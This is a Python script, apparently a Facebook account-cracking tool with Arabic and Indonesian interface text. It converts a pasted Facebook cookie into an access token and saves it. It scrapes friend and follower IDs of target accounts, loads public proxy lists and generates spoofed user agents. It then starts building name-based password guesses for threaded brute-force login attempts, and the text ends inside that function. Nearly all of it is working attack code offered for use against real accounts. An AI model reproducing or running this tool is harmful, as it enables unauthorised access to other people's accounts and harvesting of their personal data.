#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import sys
import json
import time
import base64
import random
import datetime
import urllib3
import webbrowser
from concurrent.futures import ThreadPoolExecutor as Modol, ThreadPoolExecutor as tred

import requests
import pyfiglet
import stdiomask
import bs4
from bs4 import BeautifulSoup as sop, BeautifulSoup as parser, BeautifulSoup
import rich
from rich.table import Table as me
from rich.console import Console as sol
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from rich.progress import Progress, TextColumn
from time import time as mek

# فتح رابط تليجرام
webbrowser.open('https://t.me/OQQO71')

# إعدادات الألوان
R = '\033[1;31m'  # أحمر
X = '\033[1;33m'  # أصفر
F = '\033[2;32m'  # أخضر
C = "\033[1;97m"  # أبيض
B = '\033[2;36m'  # سماوي
Y = '\033[1;34m'  # أزرق فاتح
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'
m = '\x1b[1;91m'
k = '\033[93m'
h = '\x1b[1;92m'
hh = '\033[32m'
u = '\033[95m'
kk = '\033[33m'
b = '\33[1;96m'
p = '\x1b[0;34m'

# التاريخ والوقت
now = datetime.datetime.today()
mm = str(now.month)
dd = str(now.day)
yyyy = str(now.year)
hour = str(now.hour)
mi = str(now.minute)
ss = str(now.second)
t = (mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)
hours = (now.hour)
x_date = datetime.datetime.now()
g = datetime.datetime(2026, 9, 29)

# قواميس الأشهر
dic = {
    '1': 'January', '2': 'February', '3': 'March', '4': 'April',
    '5': 'May', '6': 'June', '7': 'July', '8': 'Agustus',
    '9': 'September', '10': 'October', '11': 'November', '12': 'December'
}
dic2 = {
    '01': 'January', '02': 'February', '03': 'March', '04': 'April',
    '05': 'May', '06': 'June', '07': 'July', '08': 'Agustus',
    '09': 'September', '10': 'October', '11': 'November', '12': 'December'
}

# أسماء الملفات
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'

# تهيئة المتغيرات العامة
CON = sol()
id, id2, loop, ok, cp, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni = [], [], 0, 0, 0, [], [], [], [], [], [], [], []
cokbrut = []
pwpluss, pwnya = [], []
princp = []
ses = requests.Session()

# =============================================
# دوال التحقق من المكتبات وتثبيتها
# =============================================

def check_and_install_modules():
    """التحقق من وجود المكتبات وتثبيتها إذا لزم الأمر"""
    try:
        import rich
    except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
    
    try:
        import stdiomask
    except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
    
    try:
        import requests
    except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Requests •'))
        os.system('pip install requests')

# =============================================
# دوال البروكسي
# =============================================

def load_proxies():
    """تحميل قائمة البروكسيات"""
    try:
        prox = requests.get('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt').text
        open('.prox.txt', 'w').write(prox)
    except Exception as e:
        pass
    
    try:
        prox = requests.get('https://raw.githubusercontent.com/tiger-krd/COBRA/main/.prox.txt').text
        open('.prox.txt', 'w').write(prox)
    except Exception as e:
        pass
    
    try:
        prox = open('.prox.txt', 'r').read().splitlines()
        return prox
    except:
        return []

# =============================================
# قوائم الـ User Agents
# =============================================

def generate_user_agents():
    """توليد قائمة User Agents"""
    ugen2 = ['Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser',
             'Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser']
    
    ugen = [
        'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Safari/537.36',
        'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:50.0) Gecko/20100101 Firefox/50.0',
        'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:49.0) Gecko/20100101 Firefox/49.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:48.0) Gecko/20100101 Firefox/48.0',
        'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0)',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:48.0) Gecko/20100101 Firefox/48.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Safari/537.36',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0',
        'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:49.0) Gecko/20100101 Firefox/49.0',
        'Mozilla/5.0 (X11; Linux i686; rv:49.0) Gecko/20100101 Firefox/49.0',
        'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
        'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:51.0) Gecko/20100101 Firefox/51.0',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:51.0) Gecko/20100101 Firefox/51.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:50.0) Gecko/20100101 Firefox/50.0',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.114 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.3; rv:46.0) Gecko/20100101 Firefox/46.0',
        'Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:50.0) Gecko/20100101 Firefox/50.0',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0',
        'Mozilla/5.0 (Windows NT 6.2; rv:46.0) Gecko/20100101 Firefox/46.0',
        'Mozilla/5.0 (X11; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0',
        'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0) Gecko/20100101 Firefox/50.0',
        'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0',
        'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:47.0) Gecko/20100101 Firefox/47.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:49.0) Gecko/20100101 Firefox/49.0',
        'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Safari/537.36',
        'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:48.0) Gecko/20100101 Firefox/48.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0',
        'Mozilla/5.0 (Windows NT 6.1; rv:50.0) Gecko/20100101 Firefox/50.0',
        'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
        'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; Win64; x64; Trident/5.0)',
        'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:51.0) Gecko/20100101 Firefox/51.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0',
        'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36',
        'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; Win64; x64; Trident/5.0)',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2789.89 Safari/537.36',
        'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:46.0) Gecko/20100101 Firefox/46.0',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0',
        'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; Trident/6.0)',
        'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0',
        'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Safari/537.36',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36',
        'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Safari/537.36',
        'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Safari/537.36',
        'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; Trident/5.0)',
        'Mozilla/5.0 (Windows NT 6.1; rv:46.0) Gecko/20100101 Firefox/46.0',
        'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:47.0) Gecko/20100101 Firefox/47.0',
        'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:45.0) Gecko/20100101 Firefox/45.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:45.0) Gecko/20100101 Firefox/45.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:50.0) Gecko/20100101 Firefox/50.0',
        'Mozilla/5.0 (Windows NT 10.0; rv:51.0) Gecko/20100101 Firefox/51.0',
        'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Safari/537.36',
        'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:49.0) Gecko/20100101 Firefox/49.0',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Gecko/20100101 Firefox/51.0',
        'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:46.0) Gecko/20100101 Firefox/46.0',
        'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:50.0) Gecko/20100101 Firefox/50.0',
        'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36',
        'Mozilla/5.0 (Windows NT 5.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36',
        'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
        'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0',
        'Mozilla/5.0 (Windows NT 5.1; rv:46.0) Gecko/20100101 Firefox/46.0',
        'Mozilla/5.0 (Windows NT 6.3; rv:45.0) Gecko/20100101 Firefox/45.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:51.0) Gecko/20100101 Firefox/51.0',
        'Mozilla/5.0 (Windows NT 6.1; rv:51.0) Gecko/20100101 Firefox/51.0',
        'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
        'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:51.0) Gecko/20100101 Firefox/51.0',
        'Mozilla/5.0 (Windows NT 5.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0',
        'Mozilla/5.0 (X11; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:49.0) Gecko/20100101 Firefox/49.0'
    ]
    
    # إضافة المزيد من الـ User Agents المولدة
    for xd in range(100):
        # النوع الأول
        a = 'Nokia5350/10.1.011 (SymbianOS/10;'
        b = random.randrange(1, 9)
        c = random.randrange(1, 9)
        d = 'Series63/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1)'
        e = random.randrange(100, 9999)
        f = 'AppleWebKit/525 (KHTML, like Gecko)'
        g = random.randrange(1, 9)
        h = random.randrange(1, 4)
        i = random.randrange(1, 4)
        j = random.randrange(1, 4)
        k_ua = 'Safari/525 3gpp-gba'
        uaku = (f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k_ua}')
        ugen2.append(uaku)
        
        # النوع الثاني
        aa = 'NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (SymbianOS/9.2; U;'
        b = random.choice(['7.0', '8.1.0', '9', '10', '11', '12'])
        c = random.choice(['Series60/3.1 NokiaE71-1/100.07.57; Profile/MIDP-2.0 Configuration/CLDC-1.1 )'])
        d = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e = random.randrange(1, 999)
        f = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g = 'AppleWebKit/413 (KHTML, like Gecko)'
        h = random.randrange(80, 103)
        i = '0'
        j = random.randrange(4200, 4900)
        k_ua = random.randrange(40, 150)
        l = 'Safari/413 UNTRUSTED/1.0'
        uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k_ua} {l}'
        ugen.append(uaku2)
        
        # النوع الثالث
        aa = 'NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 12;'
        b = random.choice(['7.0', '8.1.0', '9', '10', '11', '12'])
        c = random.choice(['SAMSUNG SM-X906B)'])
        d = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e = random.randrange(1, 999)
        f = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
        h = random.randrange(80, 103)
        i = '0'
        j = random.randrange(4200, 4900)
        k_ua = random.randrange(40, 150)
        l = 'Chrome/100.0.4896.88 Safari/537.36 UNTRUSTED/1.0'
        uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k_ua} {l}'
        ugen.append(uaku2)
        
        # النوع الرابع
        aa = 'NokiaC1-01/2.0 (06.15) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US;'
        b = random.choice(['7.0', '8.1.0', '9', '10', '11', '12'])
        c = random.choice(['nokiac1-01)'])
        d = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e = random.randrange(1, 999)
        f = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g = 'U2/1.0.0 UCBrowser/8.9.0.251'
        h = random.randrange(80, 103)
        i = '0'
        j = random.randrange(4200, 4900)
        k_ua = random.randrange(40, 150)
        l = 'U2/1.0.0 Mobile UNTRUSTED/1.06'
        uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k_ua} {l}'
        ugen.append(uaku2)
    
    return ugen, ugen2

# توليد الـ User Agents
ugen, ugen2 = generate_user_agents()

# =============================================
# دوال تسجيل الدخول
# =============================================

def login():
    """دالة تسجيل الدخول الرئيسية"""
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token=' + tokenku[0], cookies={'cookie': cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2, sy3)
        except KeyError:
            login_lagi334()
    except IOError:
        login_lagi334()

def login_lagi334():
    """إعادة تسجيل الدخول"""
    try:
        os.system('clear')
        print('\n')
        k = ('\033[1;33m' + ' ╸╸╸╸╸╸╸╸╸╸╸╸╸╸  ')
        print(k)
        token = input(f' {F}({C}1{F}){B} 𝐅𝐀𝐈𝐑𝐎𝐒 {F} 𝙏𝙊𝙆𝙀𝙉 {X} : {F}  ' + R)
        k = ('\033[1;33m' + ' ╸╸╸╸╸╸╸╸╸╸╸╸╸╸  ')
        print(k)
        ID = input(f' {F}({C}2{F}){B} 𝐅𝐀𝐈𝐑𝐎𝐒 {F} 𝙄𝘿 {X} : {F}  ' + R)
        k = ('\033[1;33m' + ' ╸╸╸╸╸╸╸╸╸╸╸╸╸╸  ')
        print(k)
        
        cookie = input(f'COOKIE:')
        open(".cok.txt", "w").write(cookie)
        with requests.Session() as rsn:
            try:
                rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate'
                })
                response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie': cookie})
                if '"access_token":' in str(response.headers):
                    token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
                    open(".token.txt", "w").write(token)
                    print('كوكيز صحيح')
                else:
                    print("كوكيز غير صحيح")
            except:
                print('wrong')
        exit()
    except Exception as e:
        os.system("rm -f .token.txt")
        os.system("rm -f .cok.txt")
        exit()

def oss():
    """تسجيل الخروج"""
    os.system('rm -rf .token.txt')
    os.system('rm -rf .cookie.txt')
    print('Done')
    exit()

# =============================================
# دوال القائمة الرئيسية
# =============================================

def banner():
    """عرض البانر"""
    pass

def menu(sy2, sy3):
    """القائمة الرئيسية"""
    ip = requests.get("https://api.ipify.org").text
    os.system('clear')
    print('''███████╗  ░████╗░  █████  ██████╗░  ░█████╗░  ░██████╗
██╔════╝  ██╔═██╗  ╚═══╝  ██╔══██╗  ██╔══██╗  ██╔════╝
█████╗░░  ██║ ██║  █████  ██████╔╝  ██║░░██║  ╚█████╗░
██╔══╝░░  ██████║  ╚═══╝  ██╔══██╗  ██║░░██║  ░╚═══██╗
██║░░░░░  ██╔═██║  █████  ██║░░██║  ╚█████╔╝  ██████╔╝
╚═╝░░░░░  ╚═╝ ╚═╝  ╚═══╝  ╚═╝░░╚═╝  ░╚════╝░  ╚═════╝''')
    print(55 * '━')
    print(f'»  Your IP : {ip}')
    print('—' * 25)
    print('» 1- Crack Publik : من الاصدقاء  ')
    print(55 * '━')
    print('» 2- Fishing from followers : من المتابعين ')
    print(55 * '━')
    print('» 3- Crack File : مــن مــلــف  ')
    print(55 * '━')
    print('» 0- login out : تسجيل خروج   ')

    choice = input('\n[=] chose : ')
    print(55 * '━')
    
    if choice in ['1']:
        dump_massal()
    elif choice in ['2']:
        follower()
    elif choice in ['3']:
        TakeFile()
    elif choice in ['0']:
        oss()

# =============================================
# دوال جمع الأيدي
# =============================================

def dump_massal():
    """جمع الأيدي من الأصدقاء"""
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
    except IOError:
        exit()
    
    try:
        kumpulkan = int(input(f'عدد الايديات  :'))
    except ValueError:
        exit()
    
    if kumpulkan < 1 or kumpulkan > 100:
        exit()
    
    ses = requests.Session()
    bilangan = 0
    
    for i in range(kumpulkan):
        bilangan += 1
        Masukan = input(f'id' + str(bilangan) + f' : ')
        uid.append(Masukan)
    
    for user in uid:
        try:
            head = {
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
            }
            if len(id) == 0:
                params = ({'access_token': token, 'fields': "friends"})
            else:
                params = ({'access_token': token, 'fields': "friends"})
            url = requests.get('https://graph.facebook.com/{}'.format(user), params=params, headers=head, cookies={'cookies': cok}).json()
            for xr in url['friends']['data']:
                try:
                    woy = (xr['id'] + '|' + xr['name'])
                    if woy in id:
                        pass
                    else:
                        id.append(woy)
                except:
                    continue
        except (KeyError, IOError):
            pass
        except requests.exceptions.ConnectionError:
            exit()
    
    try:
        print(f'TOTAL ID ' + str(len(id)))
        setting()
    except requests.exceptions.ConnectionError:
        print(f'')

def follower():
    """جمع الأيدي من المتابعين"""
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
    except IOError:
        exit()
    
    try:
        jum = int(input('[>>] CRACK ID LIMIT : اكتب عدد الايديات '))
    except ValueError:
        print('{k}[✖] NOT PUBLIC ID ')
        time.sleep(3)
        follower()
    
    if jum < 1:
        print('[✖] Your limit error')
        time.sleep(3)
        follower()
    
    ses = requests.Session()
    yz = 0
    
    for met in range(jum):
        yz += 1
        kl = input('[*] ID >> ' + str(yz) + ' : ')
        uid.append(kl)
    
    for userr in uid:
        try:
            koh2 = ses.get('https://graph.facebook.com/' + userr + '?fields=subscribers.limit(99999)&access_token=' + tokenku[0], cookies={'cookie': cok}).json()
            for pi in koh2['subscribers']['data']:
                try:
                    id.append(pi['id'] + '|' + pi['name'])
                except:
                    continue
            print('[>>] Total Id : ' + str(len(id)))
            setting()
        except requests.exceptions.ConnectionError:
            print('[✖] No Connection  ')
            exit()
        except (KeyError, IOError):
            print('[✘] Id Is Not Public')
            time.sleep(3)
            follower()

def TakeFile():
    """جمع الأيدي من ملف"""
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
    except IOError:
        exit()
    
    try:
        jum = input('[?] INPUT FILE : ')
        for line in open(jum, 'r').readlines():
            id.append(line.strip())
        print('[•] Total Id : ' + str(len(id)))
        setting()
    except requests.exceptions.ConnectionError:
        print('[✘] No Connection  ')
        exit()
    except (KeyError, IOError):
        print('[✘] Id Is Not Public')
        time.sleep(3)
        follower()

# =============================================
# دوال الإعدادات
# =============================================

def setting():
    """إعدادات الكراك"""
    print("\033[2;36m ~~~~~~~~~~~~~~~~~~~~~~~")
    print('» 3- Id random :  ايديات قديمة+جديدة ')
    print('')
    hu = input('» Chose : ')
    
    if hu in ['1', '01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2', '02']:
        muda = []
        for bacot in sorted(id):
            muda.append(bacot)
        bcm = len(muda)
        bcmi = (bcm - 1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -= 1
    elif hu in ['3', '03']:
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)
    else:
        print('>> PILIH YANG BENAR BANG ')
        exit()
    
    print('>> 1. Mobile ')
    print('')
    hc = input('» Chose : ')
    
    if hc in ['1', '01']:
        method.append('mobile')
    elif hc in ['']:
        print('>> PILIH YANG BENAR BANG ')
        setting()
    elif hc in ['2', '02']:
        method.append('free')
    elif hc in ['3', '03']:
        method.append('touch')
    elif hc in ['4', '04']:
        method.append('mbasic')
    else:
        method.append('mobile')
    
    print('')
    _jembot_ = input('>>  : كتب حرف ( Y) ')
    
    if _jembot_ in ['']:
        print('>> Pilih Yang Bener Kontol ')
        back()
    elif _jembot_ in ['y', 'Y']:
        taplikasi.append('ya')
    else:
        taplikasi.append('no')
    
    pwplus = input('>>  :  اكتب حرف  (t) ')
    
    if pwplus in ['y', 'Y']:
        pwpluss.append('ya')
        cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
        pwku = input('>> Masukkan Password Tambahan : ')
        pwkuh = pwku.split(',')
        for xpw in pwkuh:
            pwnya.append(xpw)
    else:
        pwpluss.append('no')
    
    passwrd()

def back():
    """العودة للقائمة الرئيسية"""
    menu(None, None)

# =============================================
# دوال توليد كلمات المرور
# =============================================

def passwrd():
    """توليد كلمات المرور وتشغيل الكراك"""
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            
            # توليد كلمات المرور بناءً على الاسم
            if len(nmf) < 6:
                if len(frs) < 3:
                    pass
                else:
                    pwv.append(nmf)
                    pwv.append('frs')
                    pwv.append('first last')
                    pwv.append('firstfirst')
                    pwv.append('frs+frs')
                    pwv.append(frs + '123')
